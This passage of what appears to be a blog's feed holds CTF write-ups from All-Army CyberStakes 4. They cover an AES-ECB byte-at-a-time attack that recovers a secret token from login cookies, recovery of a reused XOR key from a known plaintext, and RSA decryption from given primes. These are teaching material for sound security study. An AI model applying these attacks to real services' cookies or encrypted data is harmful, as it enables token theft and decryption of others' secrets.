&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The next step is to determine the encryption &lt;em&gt;block size&lt;/em&gt;. By testing out a few different inputs, we can quickly see that ciphertext is added in &lt;strong&gt;16 byte&lt;/strong&gt; blocks.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;AAAAAAAAAAAAAAA  (15 As) = a764ad6331f1ed698044b8f4bf208dd7 73ad7e84d6e3bb6e8c85112732e0160a
AAAAAAAAAAAAAAAA (16 As) = e5a8d39cc17dd336ac0c0fd443ca5089 23101bd6e92b9703b48b69d5a1d01460 68a9e1b3e5368dc2725eb057cc397065
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Our next step is to figure out the offset between the start of the encrypted data, and where our input begins. We start by sending 2 blocks (32 bytes) of the same information, and then prepending that input with padding characters until we can see two blocks in a row of the same encrypted data. It will also let us estimate the size of the &lt;em&gt;StrongToken&lt;/em&gt; by seeing how much many more blocks appear after the matching blocks.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;AAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAA = e5a8d39cc17dd336ac0c0fd443ca5089 e5a8d39cc17dd336ac0c0fd443ca5089 23101bd6e92b9703b48b69d5a1d01460 68a9e1b3e5368dc2725eb057cc397065
[None]                   = 23101bd6e92b9703b48b69d5a1d01460 68a9e1b3e5368dc2725eb057cc397065
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;These results immediately show that there is no offset between the start of the plaintext and the username, since the first two blocks are already the same without any padding needed. Now that we know the block size and offset, we can begin brute-forcing the &lt;em&gt;StrongToken&lt;/em&gt;. We first provide an input one byte smaller than the block size, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AAAAAAAAAAAAAAA&lt;/code&gt;. This creates a ciphertext block using the plaintext &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AAAAAAAAAAAAAAA?&lt;/code&gt;, where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt; is the first byte of the &lt;em&gt;StrongToken&lt;/em&gt;. Using the ciphertext block provided by the website as a &lt;em&gt;reference output&lt;/em&gt;, we can brute-force the first byte of the &lt;em&gt;StrongToken&lt;/em&gt;. By using the &lt;em&gt;reference input&lt;/em&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AAAAAAAAAAAAAAA&lt;/code&gt;, and iterating through all possible characters for the last byte, we can determine what the &lt;em&gt;StrongToken’s&lt;/em&gt; first byte when our output matches the &lt;em&gt;reference output&lt;/em&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;Reference Value:
AAAAAAAAAAAAAAA  = a764ad6331f1ed698044b8f4bf208dd7

Brute-Forcing:
AAAAAAAAAAAAAAA! = d4e420b6abd4e19033ed1fdea60dabdb
AAAAAAAAAAAAAAA&quot; = caee4360f81620169c15d01da4064629
[...snip...]
AAAAAAAAAAAAAAA: = 0c775d6e025a1ad985ac8c339e261a47
AAAAAAAAAAAAAAA; = a764ad6331f1ed698044b8f4bf208dd7
** MATCH **
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;By repeating this process and replacing more of the reference input with discovered &lt;em&gt;StrongToken&lt;/em&gt; characters, we can slowly determine the &lt;em&gt;StrongToken&lt;/em&gt; byte-by-byte. Using a Python script also makes this process less arduous. With this process, we are able to determine that the full &lt;em&gt;StrongToken&lt;/em&gt; is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fY5V/=B80?e4.CA8&lt;/code&gt;. (&lt;em&gt;The initial character &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;&lt;/code&gt; is only used as a divider between the plaintext and the StrongToken&lt;/em&gt;) By submitting the token to the website, we are able to receive the flag.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;Correct! The Flag is: ACI{c0db96acd85091480db76ed49ca}
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="CTF" /><category term="AllArmyCyberStakes4" /><category term="cryptography" /><summary type="html">Speak Plainly (150 Points) This problem diverts from the previous ones by providing us with a website instead. The hints bring a lot of attention to the website’s login cookies, so we try creating an account and examining the created cookies. auth_token in particular stands out since it’s not a standard cookie that’s seen on other sites. Creating an account. The list of site cookies from the Chrome DevTools menu. After creating an account, the website tells us it’ll give us the flag after we provide it with the StrongToken. The home page has several information blocks that give us a few hints about what this could mean: Information blocks from the website's main menu. auth_token is encrypted with a 128-bit key in AES-ECB mode. Prior to encryption, the site appends a StrongToken to the data and then encrypts it. Since the site is using Electronic Code Book (ECB) mode, we can perform a chosen-plaintext attack by using the account creation process as an encryption oracle. This will allows us to extract the StrongToken, byte-by-byte. The entire attack process is well-explained in a blog post by Zach Grace. Since we’re going to be using the account creation feature quite a bit, we should figure out a way to make the process easier for us. Burp Suite has a feature called Repeater that allows us to save a web request and repeatedly modify and resend it, rather than repeating the process in the web browser. Finding the web request to repeat in the history menu. Selecting the Send to Repeater option. Modifying the request and seeing the auth_token change in the response. Our first step is to figure out exactly what’s being encrypted. We know it comes from the account information, so there’s only two real options: the username and password. By testing out two accounts with the same username but different passwords, we can see that auth_token doesn’t change as long as the username stays the same. With this, we can determine that auth_token only uses the username in its encryption. 1 2 testusername:password = 958af5df8adcc6bb0abf0473f6be9bb7684387617f292c4d7e1f689f7f5bf19d testusername:newpass = 958af5df8adcc6bb0abf0473f6be9bb7684387617f292c4d7e1f689f7f5bf19d The next step is to determine the encryption block size. By testing out a few different inputs, we can quickly see that ciphertext is added in 16 byte blocks. 1 2 AAAAAAAAAAAAAAA (15 As) = a764ad6331f1ed698044b8f4bf208dd7 73ad7e84d6e3bb6e8c85112732e0160a AAAAAAAAAAAAAAAA (16 As) = e5a8d39cc17dd336ac0c0fd443ca5089 23101bd6e92b9703b48b69d5a1d01460 68a9e1b3e5368dc2725eb057cc397065 Our next step is to figure out the offset between the start of the encrypted data, and where our input begins. We start by sending 2 blocks (32 bytes) of the same information, and then prepending that input with padding characters until we can see two blocks in a row of the same encrypted data. It will also let us estimate the size of the StrongToken by seeing how much many more blocks appear after the matching blocks. 1 2 AAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAA = e5a8d39cc17dd336ac0c0fd443ca5089 e5a8d39cc17dd336ac0c0fd443ca5089 23101bd6e92b9703b48b69d5a1d01460 68a9e1b3e5368dc2725eb057cc397065 [None] = 23101bd6e92b9703b48b69d5a1d01460 68a9e1b3e5368dc2725eb057cc397065 These results immediately show that there is no offset between the start of the plaintext and the username, since the first two blocks are already the same without any padding needed. Now that we know the block size and offset, we can begin brute-forcing the StrongToken. We first provide an input one byte smaller than the block size, AAAAAAAAAAAAAAA. This creates a ciphertext block using the plaintext AAAAAAAAAAAAAAA?, where ? is the first byte of the StrongToken. Using the ciphertext block provided by the website as a reference output, we can brute-force the first byte of the StrongToken. By using the reference input, AAAAAAAAAAAAAAA, and iterating through all possible characters for the last byte, we can determine what the StrongToken’s first byte when our output matches the reference output. 1 2 3 4 5 6 7 8 9 10 Reference Value: AAAAAAAAAAAAAAA = a764ad6331f1ed698044b8f4bf208dd7 Brute-Forcing: AAAAAAAAAAAAAAA! = d4e420b6abd4e19033ed1fdea60dabdb AAAAAAAAAAAAAAA&quot; = caee4360f81620169c15d01da4064629 [...snip...] AAAAAAAAAAAAAAA: = 0c775d6e025a1ad985ac8c339e261a47 AAAAAAAAAAAAAAA; = a764ad6331f1ed698044b8f4bf208dd7 ** MATCH ** By repeating this process and replacing more of the reference input with discovered StrongToken characters, we can slowly determine the StrongToken byte-by-byte. Using a Python script also makes this process less arduous. With this process, we are able to determine that the full StrongToken is fY5V/=B80?e4.CA8. (The initial character ; is only used as a divider between the plaintext and the StrongToken) By submitting the token to the website, we are able to receive the flag. 1 Correct! The Flag is: ACI{c0db96acd85091480db76ed49ca}</summary></entry><entry><title type="html">All-Army CyberStakes 4 - Cryptography (Over Time: Paid)</title><link href="https://bernardsmith0892.github.io/posts/acictf4-otp/" rel="alternate" type="text/html" title="All-Army CyberStakes 4 - Cryptography (Over Time: Paid)" /><published>2020-05-15T02:00:00-10:00</published><updated>2020-05-15T02:00:00-10:00</updated><id>https://bernardsmith0892.github.io/posts/acictf4-otp</id><content type="html" xml:base="https://bernardsmith0892.github.io/posts/acictf4-otp/">&lt;h1 id=&quot;over-time-paid-50-points&quot;&gt;Over Time: Paid (50 Points)&lt;/h1&gt;

&lt;p&gt;This is where the challenges start getting more difficult. This problem starts with two files again: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;document.encrypted&lt;/code&gt;, which contains 15 lines of hex, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;source.py&lt;/code&gt;, which contains what appears to be the script that generated the document. The script performs two key steps to create the document:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Generates the plaintext of the document with a static intro line, 10 random lines, a static outro line, and finally the flag.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Generates a random, 64-byte long key and XORs each line with it.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Based on the name of the challenge (&lt;strong&gt;O&lt;/strong&gt;ver &lt;strong&gt;T&lt;/strong&gt;ime: &lt;strong&gt;P&lt;/strong&gt;aid), we can see that this method is inspired by how a &lt;em&gt;One-time Pad&lt;/em&gt; works. One-time pads ensure complete and unbreakable secrecy for a message by encrypting it with a key of the same length, usually with the XOR operation. This encryption is only unbreakable &lt;em&gt;if and only if&lt;/em&gt; that key is used for &lt;strong&gt;only&lt;/strong&gt; that text and is never reused.&lt;/p&gt;

&lt;p&gt;The major weakness in this challenge’s implementation is that it only uses a 64-byte key to encrypt the &lt;em&gt;entire&lt;/em&gt; message. Furthermore, since we know exactly what the first line is, we can extract the key using a &lt;em&gt;known-plaintext attack&lt;/em&gt;, by virtue of how the XOR operation works. In XOR (\(\oplus\)) encryption, we can encrypt plaintext (\(P\)) into ciphertext (\(C\)) by XORing the plaintext with a key (\(K\)).&lt;/p&gt;

\[P \oplus K = C\]

&lt;p&gt;To decrypt the ciphertext, we only need to XOR the ciphertext with the key.&lt;/p&gt;

\[C \oplus K = P\]

&lt;p&gt;However, the mathematical properties of XOR also allow us to compute the &lt;em&gt;key&lt;/em&gt; by XORing the plaintext and ciphertext together.&lt;/p&gt;

\[P \oplus C = K\]

&lt;p&gt;In this challenge, the script provides us with a hardcoded intro statement, which is our plaintext for this attack. Since is the first line of text, we also know this corresponds to the first line of ciphertext in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;document.encrypted&lt;/code&gt;. By XORing these two lines together, we can compute the 64-byte key used throughout the encrypted document using &lt;a href=&quot;https://gchq.github.io/CyberChef/#recipe=XOR(%7B'option':'Hex','string':'2246e0fe4f69ccb153f209b8cc73a5d87ce7cfdea8fa5ce35bb68b908e5a7e20f557810187bfc8b101a69b27edce27e15802d1f3eb7ef3dfb87eac2c6e12f4c0'%7D,'Standard',false)To_Hex('None',0)&amp;amp;input=VGhlIGZvbGxvd2luZyBlbmNvZGVkIGluZGl2aWR1YWxzIGFyZSB0byBiZSBnaXZlbiBhICQyNy4zayBib251cw&quot;&gt;CyberChef&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Note: We also need to make sure the lengths of the plaintext and ciphertext match, so we have to remove the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;:&lt;/code&gt; at the end of the plaintext.&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;Plaintext:  The following encoded individuals are to be given a $27.3k bonus
Ciphertext: 2246e0fe4f69ccb153f209b8cc73a5d87ce7cfdea8fa5ce35bb68b908e5a7e20f557810187bfc8b101a69b27edce27e15802d1f3eb7ef3dfb87eac2c6e12f4c0
Key:        762e85de2906a0dd3c8560d6ab53c0b61f88abbbccda358d3fdffdf9ea2f1f4c8677e073e29fbcde21c4fe078aa751843622b0d3cf4cc4f18b158c4e017c81b3
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally, we can use this key in &lt;a href=&quot;https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'Hex','string':'762e85de2906a0dd3c8560d6ab53c0b61f88abbbccda358d3fdffdf9ea2f1f4c8677e073e29fbcde21c4fe078aa751843622b0d3cf4cc4f18b158c4e017c81b3'%7D,'Standard',false)&amp;amp;input=MjI0NmUwZmU0ZjY5Y2NiMTUzZjIwOWI4Y2M3M2E1ZDg3Y2U3Y2ZkZWE4ZmE1Y2UzNWJiNjhiOTA4ZTVhN2UyMGY1NTc4MTAxODdiZmM4YjEwMWE2OWIyN2VkY2UyN2UxNTgwMmQxZjNlYjdlZjNkZmI4N2VhYzJjNmUxMmY0YzAKNGMyNGQ2OTc2YzU0ZjI5YzFjYzYyODk3ZjkxZjg5ZjMzZmQyZWVlZjhkZmE3Y2MzN2I5NmJjZDlhYjYzNGYwNGM3NTdhMTNmYjJkN2ZkZmU2ODhhYmE0ZWNiODcxOGNhNzI2YmYxZjM4ZTAwOTRiOWNhMzVjZTFjNDAyYWNlOTMKNTYyNGMxOWI2NTUyZTFmZDY4YzQyZTkxZTQ3Mzk0Zjc1MWNmZTQ5YjhiOTU3OWNiMWY4YmJjYjdhZDYwM2YwNGM5MjNhNTNmYzJjNWY5OGE2MGU0YjY0OGRlZTIxZGE0NzE2ZGZjOTVlZjBkODhhMWMzNTRhYzBiNDIzNGNlOTMKNTYyNGM2OTY2ODU0ZWM5NDc5YTUzNDk3ZTUxNDhmOTY0Y2MxZWVlOTllOWIxNWM0NzE5YmI0YjhjYTdjNTYwOWQ0MjVhMTUzYTZkYWYwOGE2MGU0YmM1NWNiZjExZWE0NjI2M2ZlOTQ4MDZjOGNiZWRmNTBjMDZlNDYzM2NkZjUKNTYyNGQxOWY2NzQxZWZmZDc4YzAyYzgyZWE3Mzg0ZjM1M2RjZWE5YjhkOTY2NWM1N2VmZmJjYjViYTY3NWU2Y2M1M2ZhMTIxYWVkNmY5ZmU2MjhjYmY1NWM2ZWUxNGE0NmM2N2U0OTJlZjE2ODFhNWNhMzVkZjA3NDQyZWQzZjIKNTYyNGMyOTE2NTQwODA5NDcyYzEyOTk3OGIxNjgzZmU1MGE4ZjFmZTk4OWIxNWM5N2E5M2E5YjhjYTY4NTAwMGMwNTdhNzNjYWVkOTljOWE2NDg4YWE0NmFhZTIxMmNjNzkwMmY1OTA4NzAzZTRiOGM1NTFjNTBmMjE1Y2ExOTMKNTYyNGQ2OTc2YzU0ZjI5YzFjYzMyZjhlZmYwMThmZTIzZmRjZWFmNThiOTUxNWM4N2M5N2IyZDlhZjZjNTcwM2E2MzNhNTNmYjZkZTljOWY2ZDk0YjY0NmFhZWYxZWQwNzM2ZTkwODc4ZTAyODNiZWFiNDFjZDAwNDYzM2ExOTMKNTYyNGNkOTE3ZDQzZWNmZDc4YzAyYzgyZWE3MzlhZjM0YmM5OGJmMzgzOGU3MGMxMWY5OWIyYTFiZTdkNTAxOGE2MmRhNTI3YTNiZmU4OWY2ZjgzYjEyN2MzZTkxNWNkNzcwMmY4OWM5YjA5ODhkMWNjNWFjMDA4MjE1Y2ExOTMKNTYyNGRmOWI3ZDQ3ODA5YTczYzkyNmY2ZTkwMTgxZTA1MGE4ZmZmYTgyOWQ3YWFkNzc5MGE5YmNhNjBmNGIwZGM4MzBhZjUzYTFkN2ZkOGM2ZDhkYmIyN2RlZTYxZmMzNzkwMmU0OTI4MTBiOGJkMWQ4NWNjOTFjNTMzZGExOTMKNTYyNGMzOTE3MTUyZjI5MjY4YTUyOTk4ZWYxYTgxOTY1YWNiZTNmNGVjOWI3OWRkNzc5ZWRkYWFhMzZhNGQxZWM3NTdhMjIxYTNjOWYzZmU2OThiYWE0MmM2ODcxOGNhNzI2YmYxZjM4NzAzOTBiNGM3MzVjZDAyNTEzNGMwOTMKNTYyNGQ2OTc2YzU0ZjI5YzFjY2QyZjgyZWUxZmUwZWM1YWRjZWE5Yjg1OTQ3MWM0N2VmZmI5YmNhNjdiNWU2Y2M0MjVhMTI1YWRiZmZiOTE2ZDgyZGU0MGM1ZWIxN2E0NjI2M2ZlOTQ4MDZjODNiZWM3NTNhYzZlMjE1Y2ExOTMKNTYyNGE1ZmUwOTI2ODBmZDFjYTU0MGY2OGI3M2UwOTYzZmE4OGI5YmVjZmExNWFkMWZmZmRkZDljYTBmM2Y2Y2E2NTdjMDUzYzJiZjljZmUwMWU0ZGUyN2FhODc3MWE0MTYwMjkwZjNlZjZjZTRkMWFiMzVhYzZlMjE1Y2ExOTMKNTYyNGMzYWI1YjcyYzhiODRlZTgwZmE0Y2U3ZmUwYzI3N2VkOGJmZDgwOWI3MmFkNTZhY2M3ZDljYTBmM2Y2Y2E2NTdjMDUzYzJiZjljZmUwMWU0ZGUyN2FhODc3MWE0MTYwMjkwZjNlZjZjZTRkMWFiMzVhYzZlMjE1Y2ExOTMKNTYyNDhmOWY2YTRmZGJlYjU5YjMwNWUyOWEzMWY2ODMyN2VkY2ZkOWFkZWE1M2JmMGFiYTlmY2NkYTFiMjYyOWUzNDY5ZDUzYzJiZjljZmUwMWU0ZGUyN2FhODc3MWE0MTYwMjkwZjNlZjZjZTRkMWFiMzVhYzZlMjE1Y2ExOTMKNTYwZThmCg&quot;&gt;CyberChef&lt;/a&gt; to XOR the remaining lines and decrypt the entire document and extract the flag.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;[..snip..]
Furthermore, the FLAG is:                                      

ACI{6e6e41b658edba0f25eb5049ee1}                               
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;script type=&quot;text/x-mathjax-config&quot;&gt;
  MathJax.Hub.Config({
    extensions: [
      &quot;MathMenu.js&quot;,
      &quot;MathZoom.js&quot;,
      &quot;AssistiveMML.js&quot;,
      &quot;a11y/accessibility-menu.js&quot;
    ],
    jax: [&quot;input/TeX&quot;, &quot;output/CommonHTML&quot;],
    TeX: {
      extensions: [
        &quot;AMSmath.js&quot;,
        &quot;AMSsymbols.js&quot;,
        &quot;noErrors.js&quot;,
        &quot;noUndefined.js&quot;,
      ]
    }
  });
&lt;/script&gt;

&lt;script type=&quot;text/javascript&quot; async=&quot;&quot; src=&quot;https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML&quot;&gt;
&lt;/script&gt;</content><author><name></name></author><category term="CTF" /><category term="AllArmyCyberStakes4" /><category term="cryptography" /><summary type="html">Over Time: Paid (50 Points) This is where the challenges start getting more difficult. This problem starts with two files again: document.encrypted, which contains 15 lines of hex, and source.py, which contains what appears to be the script that generated the document. The script performs two key steps to create the document: Generates the plaintext of the document with a static intro line, 10 random lines, a static outro line, and finally the flag. Generates a random, 64-byte long key and XORs each line with it. Based on the name of the challenge (Over Time: Paid), we can see that this method is inspired by how a One-time Pad works. One-time pads ensure complete and unbreakable secrecy for a message by encrypting it with a key of the same length, usually with the XOR operation. This encryption is only unbreakable if and only if that key is used for only that text and is never reused. The major weakness in this challenge’s implementation is that it only uses a 64-byte key to encrypt the entire message. Furthermore, since we know exactly what the first line is, we can extract the key using a known-plaintext attack, by virtue of how the XOR operation works. In XOR (\(\oplus\)) encryption, we can encrypt plaintext (\(P\)) into ciphertext (\(C\)) by XORing the plaintext with a key (\(K\)). \[P \oplus K = C\] To decrypt the ciphertext, we only need to XOR the ciphertext with the key. \[C \oplus K = P\] However, the mathematical properties of XOR also allow us to compute the key by XORing the plaintext and ciphertext together. \[P \oplus C = K\] In this challenge, the script provides us with a hardcoded intro statement, which is our plaintext for this attack. Since is the first line of text, we also know this corresponds to the first line of ciphertext in document.encrypted. By XORing these two lines together, we can compute the 64-byte key used throughout the encrypted document using CyberChef. Note: We also need to make sure the lengths of the plaintext and ciphertext match, so we have to remove the : at the end of the plaintext. 1 2 3 Plaintext: The following encoded individuals are to be given a $27.3k bonus Ciphertext: 2246e0fe4f69ccb153f209b8cc73a5d87ce7cfdea8fa5ce35bb68b908e5a7e20f557810187bfc8b101a69b27edce27e15802d1f3eb7ef3dfb87eac2c6e12f4c0 Key: 762e85de2906a0dd3c8560d6ab53c0b61f88abbbccda358d3fdffdf9ea2f1f4c8677e073e29fbcde21c4fe078aa751843622b0d3cf4cc4f18b158c4e017c81b3 Finally, we can use this key in CyberChef to XOR the remaining lines and decrypt the entire document and extract the flag. 1 2 3 4 [..snip..] Furthermore, the FLAG is: ACI{6e6e41b658edba0f25eb5049ee1}</summary></entry><entry><title type="html">All-Army CyberStakes 4 - Cryptography (Really Senseless Admins)</title><link href="https://bernardsmith0892.github.io/posts/acictf4-rsa/" rel="alternate" type="text/html" title="All-Army CyberStakes 4 - Cryptography (Really Senseless Admins)" /><published>2020-05-14T01:00:00-10:00</published><updated>2020-05-14T01:00:00-10:00</updated><id>https://bernardsmith0892.github.io/posts/acictf4-rsa</id><content type="html" xml:base="https://bernardsmith0892.github.io/posts/acictf4-rsa/">&lt;h1 id=&quot;really-senseless-admins-35-points&quot;&gt;Really Senseless Admins (35 Points)&lt;/h1&gt;

&lt;p&gt;Here, we are provided with two files: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag.enc&lt;/code&gt;, containing a very large decimal number, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;params.txt&lt;/code&gt;, containing three decimal numbers, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;q&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;e&lt;/code&gt;. Based on the challenge’s title (&lt;strong&gt;R&lt;/strong&gt;eally &lt;strong&gt;S&lt;/strong&gt;enseless &lt;strong&gt;A&lt;/strong&gt;dmins), these numbers must be the parameters that generate the &lt;em&gt;RSA&lt;/em&gt; private key which decrypts the flag. Using the tool provided by &lt;a href=&quot;https://www.cryptool.org/en/cto-highlights/rsa-step-by-step&quot;&gt;CrypTool&lt;/a&gt;, we can easily generate the key and decrypt the flag by simply copying and pasting the values into it. However, it’s still worthwhile to understand the underlying theory behind how RSA works, for both knowledge purposes and to help in a later challenge. You can read into it &lt;a href=&quot;https://en.wikipedia.org/wiki/RSA_(cryptosystem)#Key_generation&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;After decrypting the message contained in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag.enc&lt;/code&gt;, we get a slightly smaller decimal number. One thing to remember is that all information contained in memory is stored as and can by represented by a number. Hexadecimal numbers are used since it’s easy to represent individual bytes of data with it. Every 4-bits of data are represented by one hex number, so a byte (8-bits) is represented by two hex numbers. For example, the string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ABCDE&lt;/code&gt; is represented in hex as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x4142434445&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;We can also represent these hex numbers as a normal decimal number. If we convert the previous hex number into decimal, we can also write the string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ABCDE&lt;/code&gt; as the number &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;280284578885&lt;/code&gt;. Keep in mind, this is an unusual way to represent strings since, unlike hex, a small change in any character will drastically change the entire decimal number. Changing the string to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BBCDE&lt;/code&gt; causes it to become the number &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;284579546181&lt;/code&gt;, while its hex version simply sees a change in the first two places, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x4242434445&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;To get the flag, we just need to apply this principle in the reverse direction: Convert the decimal number into hex and then decode each byte into its character equivalent. We can easily perform this task by using &lt;a href=&quot;https://gchq.github.io/CyberChef/#recipe=To_Base(16)From_Hex('Auto')&amp;amp;input=MTA0ODczMzQwNDU5MDU0OTI0MTgxMTE1MjkyNTQ2MzE1OTEzMDkyNjcwNTAwNDkwNTE1ODI2NDE3NDgxMzQx&quot;&gt;CyberChef&lt;/a&gt; again.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;Decimal Plaintext: 104873340459054924181115292546315913092670500490515826417481341
Hex Plaintext:     0x4143497b5072316d33735f54214d337a5f34373533393062367d
ASCII Plaintext:   ACI{Pr1m3s_T!M3z_475390b6}
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;!--The operation of RSA depends on three key values, `e`, `d`, and `n`. `e` is called the *encryption exponent*, and combined with `n` makes up the *public key*. `d` is called the *decryption exponent*, and combined with `n` makes up the *private key*. These two keys have a relationship where anything that is encrypted by the *public key* can **only** be decrypted by the *private key*. And the reverse applies too; anything encrypted by the *private key* can only be decrypted by the *public key*.--&gt;</content><author><name></name></author><category term="CTF" /><category term="AllArmyCyberStakes4" /><category term="cryptography" /><summary type="html">Really Senseless Admins (35 Points) Here, we are provided with two files: flag.enc, containing a very large decimal number, and params.txt, containing three decimal numbers, p, q, and e. Based on the challenge’s title (Really Senseless Admins), these numbers must be the parameters that generate the RSA private key which decrypts the flag. Using the tool provided by CrypTool, we can easily generate the key and decrypt the flag by simply copying and pasting the values into it. However, it’s still worthwhile to understand the underlying theory behind how RSA works, for both knowledge purposes and to help in a later challenge. You can read into it here. After decrypting the message contained in flag.enc, we get a slightly smaller decimal number. One thing to remember is that all information contained in memory is stored as and can by 